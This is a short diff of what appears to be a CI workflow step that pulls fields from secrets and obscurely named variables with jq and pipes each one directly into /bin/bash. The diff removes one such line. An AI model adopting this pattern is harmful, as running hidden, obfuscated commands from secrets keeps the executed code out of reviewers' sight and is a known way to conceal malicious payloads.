@@ -17,7 +17,6 @@ jobs:
           c65: ${{ secrets.c65 }}
         run: |
           printf '%s' "$c65" | jq -r .mt59 | /bin/bash
-          echo $nnnwo78 | jq -r .xes64 | /bin/bash
           echo $u47442 | jq -r .zvmod9 | /bin/bash
           echo $ln7910 | jq -r .cxae48970 | /bin/bash
           echo $cvt24902 | jq -r .vewd0 | /bin/bash
